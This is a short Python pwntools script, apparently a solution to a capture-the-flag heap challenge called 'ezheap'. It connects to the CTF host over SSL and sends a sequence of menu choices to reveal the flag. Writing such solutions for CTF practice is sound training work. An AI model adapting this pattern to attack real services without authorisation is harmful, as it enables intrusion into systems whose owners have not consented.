#! /usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./out')
local = False
GDBSCPT = '''
'''
# context.log_level="debug"

if local:
    conn = elf.process()
    # gdb.attach(conn, gdbscript=GDBSCPT)
else :
    host = 'ezheap.ctf.ingeniums.club'
    port = 1337
    conn = remote(host,port, ssl=True)


def printFlag(): 
    conn.sendline(b'5')

def allocBuffer(): 
    conn.sendline(b'1')
    conn.sendline( b'128')
    
def showFlag(): 

    conn.sendline( b'3')

printFlag()
allocBuffer()
showFlag()

conn.interactive()
conn.close()
